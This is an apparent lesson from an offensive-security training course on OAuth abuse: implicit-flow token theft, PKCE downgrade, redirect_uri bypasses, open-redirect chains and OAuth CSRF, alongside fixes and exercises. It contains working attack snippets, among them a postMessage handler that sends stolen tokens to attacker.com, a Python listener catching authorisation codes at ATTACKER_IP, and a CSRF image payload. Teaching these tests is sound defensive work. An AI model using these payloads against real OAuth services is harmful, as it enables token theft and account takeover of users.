---
title: "OAuth Abuse Deep Dive — Implicit Flow Token Theft, PKCE Downgrade, Open Redirect Chains"
tags: [OAuth, OAuth2, implicit-flow, token-theft, PKCE, PKCE-downgrade, open-redirect,
       state-parameter, authorization-code, token-hijacking, ATT&CK-T1550, CWE-601]
module: 04-BroadSurface-01
day: 171
related_topics:
  - OAuth 2.0 Basics (Day 43)
  - OpenID Connect and SAML (Day 44)
  - JWT Advanced Lab (Day 170)
  - OAuth Attack Lab (Day 172)
  - Account Takeover Chains (Day 174)
---

# Day 171 — OAuth Abuse Deep Dive

> "OAuth was designed by committee to solve a hard problem under difficult
> constraints. The spec is 75 pages. Every implementation cuts corners
> somewhere. Your job is to find which corner. It is always one of four
> things: the redirect_uri, the state parameter, the PKCE challenge, or
> the implicit flow. Enumerate the OAuth endpoints. Test each one
> systematically. The token is at the end."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Map the full OAuth 2.0 Authorization Code flow and identify every
   security control and its bypass condition.
2. Steal an access token via the implicit flow by exploiting a fragment
   identifier leak or a postMessage misconfiguration.
3. Downgrade an Authorization Code + PKCE flow to the plain code flow by
   removing or altering the `code_challenge` parameter.
4. Chain an open redirect on the authorisation server to hijack the
   authorisation code or access token.
5. Bypass CSRF protection via state parameter manipulation.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| OAuth 2.0 Authorization Code flow | Day 43 |
| Open redirect | Day 133 |
| JWT structure and attacks | Days 42, 169 |
| CSRF fundamentals | Day 89 |
| Burp Suite | Days 22–24 |

---

## OAuth Attack Surface Map

```
Authorization Server (AS)
    ├── /oauth/authorize      ← redirect_uri validation, state, PKCE
    ├── /oauth/token          ← code exchange, client secret, PKCE verifier
    ├── /oauth/userinfo       ← access token validation
    └── /.well-known/oauth-authorization-server   ← metadata

Client Application
    ├── /oauth/callback       ← redirect target — state validation here
    ├── /logout               ← potential open redirect
    └── /[any page]           ← postMessage handler, fragment leakage
```

---

## Part 1 — Implicit Flow Token Theft

The implicit flow (OAuth 2.0 legacy, not in OAuth 2.1) returns the access token
directly in the redirect URL **fragment** (`#access_token=...`). Fragments are
never sent to servers — they exist only in the browser. But they are accessible
to JavaScript on the same page.

### 1.1 — Fragment Leakage via Referrer

If the callback page includes any third-party resource (analytics, CDN scripts),
the browser sends the full URL including the fragment as the `Referer` header:

```
1. AS redirects: https://app.com/callback#access_token=TOKEN&token_type=bearer
2. Callback page loads analytics: <script src="https://analytics.com/track.js">
3. Browser sends: Referer: https://app.com/callback#access_token=TOKEN
4. Analytics server logs the full URL including the token
```

**Test:**

```bash
# Check the callback page for third-party resources
curl -s https://app.com/oauth/callback \
  | grep -oE 'src="https?://[^"]*"|href="https?://[^"]*"' \
  | grep -v "app.com"
```

Any external resource on the callback page is a potential referrer leak.

### 1.2 — postMessage Misconfiguration

Single-page applications often use `window.postMessage` to send the OAuth
token from the callback iframe/window to the main application window.

**Vulnerable code:**

```javascript
// Parent window — VULNERABLE: no origin check
window.addEventListener("message", (event) => {
  // BUG: event.origin not validated
  const token = event.data.access_token;
  storeToken(token);
});
```

**Attack:**

```javascript
// Attacker's page — must get the victim to open it while authenticated
// 1. Open OAuth flow in a child window
const popup = window.open(
  "https://auth.target.com/oauth/authorize?response_type=token" +
  "&client_id=CLIENT_ID&redirect_uri=https://app.target.com/callback"
);

// 2. When callback fires, the app posts the token to its parent (this window)
// 3. Our message handler receives it because no origin check
window.addEventListener("message", (e) => {
  fetch("https://attacker.com/steal?t=" + encodeURIComponent(e.data.access_token));
});
```

**Why it works:** the callback calls `window.opener.postMessage(tokenData, "*")`.
The wildcard `"*"` allows any origin to receive the message — including the
attacker's page that opened the popup.

**Fix:** `window.opener.postMessage(tokenData, "https://app.target.com")`.

---

## Part 2 — PKCE Downgrade

PKCE (Proof Key for Code Exchange) prevents authorisation code interception by
binding the code to a secret verifier. Without PKCE, stealing the authorisation
code from the redirect URL is sufficient to exchange it for a token.

### PKCE Review

```
Client generates:
  code_verifier  = random 43–128 char string
  code_challenge = base64url(SHA256(code_verifier))

Authorization Request:
  GET /oauth/authorize
    ?code_challenge=<hash>
    &code_challenge_method=S256
    ...

Token Exchange:
  POST /oauth/token
    code=AUTH_CODE
    code_verifier=<original>       ← server verifies SHA256(verifier) == challenge
```

### 2.1 — Remove code_challenge Entirely

If the server does not require PKCE, simply omit the `code_challenge`:

```bash
# Without PKCE — send authorisation request without challenge
curl -sv "https://auth.target.com/oauth/authorize?\
response_type=code\
&client_id=app-client\
&redirect_uri=https://app.target.com/callback\
&scope=openid profile"
# → If server redirects with code → PKCE not required
```

If the server issues a code without `code_challenge` → PKCE is not enforced.
Authorisation codes stolen from the redirect URL (logs, referrer, open redirect)
can be exchanged directly.

### 2.2 — Downgrade code_challenge_method to plain

The `plain` method means `code_challenge == code_verifier` (no hash). If the
server accepts `plain`, the challenge is trivial to satisfy:

```bash
# Authorisation request with plain method
curl "https://auth.target.com/oauth/authorize?\
response_type=code\
&client_id=app-client\
&redirect_uri=https://app.target.com/callback\
&code_challenge=my_verifier\
&code_challenge_method=plain"

# Token exchange — verifier equals challenge
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code\
     &code=AUTH_CODE\
     &code_verifier=my_verifier"
```

If `plain` is accepted, the PKCE protection is eliminated — any attacker who
knows the `code_challenge` (visible in the authorisation URL) can construct
the `code_verifier` directly.

### 2.3 — PKCE Bypass via Empty Verifier

Some implementations check that `code_verifier` is present but not that it
actually matches the stored challenge:

```bash
# Exchange with empty verifier
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&code_verifier="
```

If this succeeds → PKCE validation is present but broken.

---

## Part 3 — Open Redirect → Token Hijacking

An open redirect on the client application (or the authorisation server) allows
the attacker to redirect the OAuth callback to their own server, stealing either
the authorisation code (Authorization Code flow) or the access token (implicit).

### 3.1 — redirect_uri Validation Bypass

The authorisation server should validate `redirect_uri` against a registered
whitelist. Common bypasses:

| Bypass technique | Example | Bypasses |
|---|---|---|
| Path traversal | `https://app.com/callback/../evil` | Prefix-only check |
| Subdomain | `https://evil.app.com/callback` | Suffix-only check |
| Double slash | `https://app.com//evil.com` | Single slash normalisation |
| Fragment bypass | `https://app.com/callback#https://evil.com` | No fragment check |
| Embedded creds | `https://app.com@evil.com/callback` | URL parser confusion |
| Open redirect chain | `https://app.com/redirect?url=https://evil.com` | Registered domain + redirect |

**The most reliable:** registered open redirect.

### 3.2 — Open Redirect Chain Attack

If `https://app.com/logout?next=` is an open redirect AND `https://app.com/`
is a registered `redirect_uri` prefix:

```
1. Attacker sends victim a crafted authorisation URL:

   https://auth.target.com/oauth/authorize
     ?response_type=code
     &client_id=app-client
     &redirect_uri=https://app.target.com/logout?next=https://attacker.com
     &state=FAKE_STATE

2. Victim authenticates and authorizes.

3. AS redirects to:
   https://app.target.com/logout?next=https://attacker.com&code=AUTH_CODE

4. logout endpoint redirects to attacker.com — code is in the Referer header:
   Referer: https://app.target.com/logout?next=https://attacker.com&code=AUTH_CODE

5. Attacker server logs the Referer → extracts AUTH_CODE.

6. Attacker exchanges code for access token:
   POST https://auth.target.com/oauth/token
   code=AUTH_CODE&...
```

### 3.3 — Step-by-Step Exploit Script

```python
import webbrowser, http.server, urllib.parse, threading

# Step 1: Start local server to catch the redirect
captured_code = {}

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        qs = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        if "code" in qs:
            captured_code["code"] = qs["code"][0]
            print(f"[+] Captured code: {qs['code'][0]}")
        self.send_response(200)
        self.end_headers()

server = http.server.HTTPServer(("0.0.0.0", 8888), Handler)
thread = threading.Thread(target=server.handle_request)
thread.start()

# Step 2: Open crafted authorization URL (victim must click this)
oauth_url = (
    "https://auth.target.com/oauth/authorize"
    "?response_type=code"
    "&client_id=TARGET_CLIENT_ID"
    "&redirect_uri=https://app.target.com/logout?next=http://ATTACKER_IP:8888"
    "&scope=openid profile email"
    "&state=CSRF_BYPASS"
)
print(f"[*] Send victim this URL:\n{oauth_url}")

thread.join()
print(f"[+] Got auth code: {captured_code.get('code')}")
```

---

## Part 4 — State Parameter Bypass (CSRF on OAuth)

The `state` parameter prevents CSRF on the OAuth flow. Without it, an attacker
can initiate an OAuth flow on behalf of the victim, binding the victim's
account to the attacker's identity provider account.

### 4.1 — Missing State Parameter

```bash
# Confirm state is not required
curl -sv "https://auth.target.com/oauth/authorize?\
response_type=code&client_id=CLIENT&redirect_uri=https://app.com/callback"
# → If redirect issues code without state → CSRF possible
```

### 4.2 — Predictable State Parameter

```bash
# Capture several authorization URLs and compare state values
# If state = base64(timestamp) or sequential integer → predictable
echo -n "1703980800" | base64   # predictable state based on Unix time
```

### 4.3 — OAuth CSRF Attack

With a missing or predictable state:

```html
<!-- Attacker's page — served to victim -->
<img src="https://auth.target.com/oauth/authorize
  ?response_type=code
  &client_id=CLIENT
  &redirect_uri=https://app.com/callback
  &state=ATTACKER_CONTROLLED_STATE" />

<!-- When victim loads this page, they authorize. The callback code is
     sent to https://app.com/callback?code=X&state=ATTACKER_STATE.
     The app links the victim's session to the attacker's OAuth identity. -->
```

This attack links the attacker's OAuth account to the victim's application
account — the attacker can then log in as the victim using their own OAuth
credentials.

---

## Real-World Cases

| Case | Technique | Impact |
|---|---|---|
| **Facebook OAuth 2013 (Nir Goldshlager)** | redirect_uri parameter bypass | Access token theft for any user |
| **GitHub OAuth 2014 (Egor Homakov)** | Missing state parameter | CSRF → account takeover |
| **Slack OAuth (HackerOne, 2018)** | redirect_uri subdomain bypass | Token theft |
| **Dropbox (HackerOne)** | Implicit flow + referrer leak | Token in Referer to analytics |
| **PayPal OAuth (HackerOne, 2016)** | Open redirect chain | Access token hijacking |
| **Uber OAuth (HackerOne, 2016)** | redirect_uri regex bypass | Account linking CSRF |

---

## Key Takeaways

1. **The implicit flow should not be used.** It is not in OAuth 2.1. Every
   implicit flow deployment is a potential token theft vector. Migrate to
   Authorization Code + PKCE.
2. **PKCE without enforcement is useless.** Verify that omitting `code_challenge`
   causes the server to reject the authorisation request.
3. **redirect_uri validation failures are common.** Test prefix, suffix,
   path traversal, subdomain, and URL parser confusion bypasses on every
   OAuth implementation you test.
4. **Open redirect + OAuth = code theft.** Any open redirect on a registered
   redirect URI domain is a critical OAuth vulnerability.
5. **The state parameter is the CSRF token of OAuth.** Its absence is a
   confirmed CSRF vulnerability — no need to build a PoC if the state parameter
   is simply missing.

---

## Exercises

1. On any OAuth application you control (or a test instance), enumerate all
   registered `redirect_uri` values. Test each bypass technique from Part 3.1.
2. Configure a local OAuth server (Keycloak community edition or oauth2-server
   npm package). Enable the implicit flow. Demonstrate the fragment leak via
   referrer by including a `<script>` tag to an external URL on the callback
   page.
3. Write a test script that checks whether PKCE enforcement is present on
   an OAuth server: (a) omit `code_challenge`; (b) use `plain` method;
   (c) use empty verifier. Report which of the three the server accepts.
4. Find a public HackerOne disclosure involving an OAuth redirect_uri bypass.
   Explain the specific bypass technique used and the fix applied.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q171.1, Q171.2 …).
> Follow-up questions use hierarchical numbering (Q171.1.1, Q171.1.2 …).

---

## Navigation

← Previous: [Day 170 — JWT Advanced Lab](DAY-0170-JWT-Advanced-Lab.md)
→ Next: [Day 172 — OAuth Attack Lab](DAY-0172-OAuth-Attack-Lab.md)
